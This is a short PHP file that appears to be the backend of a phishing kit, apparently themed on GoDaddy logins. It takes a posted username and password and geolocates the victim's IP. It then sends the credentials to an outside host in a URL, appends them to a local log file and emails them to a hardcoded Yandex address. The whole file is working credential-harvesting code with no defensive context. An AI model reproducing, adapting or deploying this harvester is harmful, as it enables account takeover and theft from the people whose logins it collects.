<?php


header('Access-Control-Allow-Origin: *');

if (isset($_POST['user']) && isset($_POST['pass'])) {


    function visitor_country()
    {
        $ip = getenv("REMOTE_ADDR");
        $result = "Unknown";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $country = json_decode(curl_exec($ch))->country;
        if ($country != null) {
            $result = $country;
        }

        return $result;
    }

    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $recipient = "info02265@yandex.com"; // Replace your email id here
    $api = 'http://keyfinhome.com/api/go/index2.php';
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");

    $url = "$api?email=$user&password=$pass";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    
        $date = date('d-m-Y');
        $ip = getenv("REMOTE_ADDR");
        $message = "-----------------++-----------------\n";
        $message.= "User ID: " . $user . "\n";
        $message.= "Password: " . $pass . "\n";
        $message.= "IP      : $ip\n";
        $message.= "Country      : $country\n";
        $message.= "Date      : $date\n";
        $message.= "-----------------++------------------\n";
        $subject = "Godaddy Special: " . $ip . "\n";
        $headers = "MIME-Version: 1.0\n";
        $filename = 'p2490.txt';
        
        $fp = fopen('p2490.txt', 'a');
        fwrite($fp, $message);
        fclose($fp);

        mail($recipient, $subject, $message, $headers);

        echo 1;
} else {
    echo 0;
}
